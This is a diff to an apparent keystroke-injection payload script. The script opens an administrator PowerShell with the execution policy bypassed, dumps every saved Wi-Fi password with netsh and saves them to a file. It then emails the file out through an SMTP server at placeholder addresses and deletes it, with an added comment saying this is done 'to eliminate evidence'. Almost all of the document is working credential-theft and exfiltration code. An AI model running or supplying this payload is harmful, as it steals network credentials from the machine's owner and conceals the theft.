@@ -9,7 +9,9 @@ REM      You can use REM to comment out the parts that send the email or even de
 
 WINDOWS r
 DELAY 500
-REM Open PowerShell as Administrator
+
+REM Open PowerShell as Administrator and preparation
+
 STRING powershell -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass' -Verb RunAs"
 ENTER
 DELAY 4000
@@ -25,10 +27,14 @@ ENTER
 REM Initialize Profiles Array
 STRING $Profiles = @()
 ENTER
+
 REM Get Wi-Fi Profiles
+
 STRING $Profiles += (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
 ENTER
+
 REM Extract Passwords
+
 STRING $res = $Profiles | ForEach-Object {
 ENTER
 STRING     $SSID = $_
@@ -54,9 +60,14 @@ ENTER
 REM Save Results
 STRING $res | Out-File -FilePath "$env:USERPROFILE\Desktop\wifi_pass.txt" -Encoding ASCII -Width 50
 ENTER
+
 REM Send the email with the attachment
+
 STRING Send-MailMessage -To "TO@MAIL.END" -From "FROM@MAIL.END" -Subject "WiFi Passwords" -Body "Here are the saved WiFi passwords." -SmtpServer "smtp.MAIL.com" -Port 587 -UseSsl -Credential (New-Object System.Management.Automation.PSCredential("FROM@MAIL.END", ("PASSWORD (Use an app password for better security)" | ConvertTo-SecureString -AsPlainText -Force))) -Attachments "$env:USERPROFILE\Desktop\wifi_pass.txt"
 ENTER
+
+REM Deletion of the file storing the access points and passwords we just sent via email to eliminate evidence.
+
 DELAY 500
 STRING Remove-Item -Path "$env:USERPROFILE\Desktop\wifi_pass.txt" -Force
 ENTER
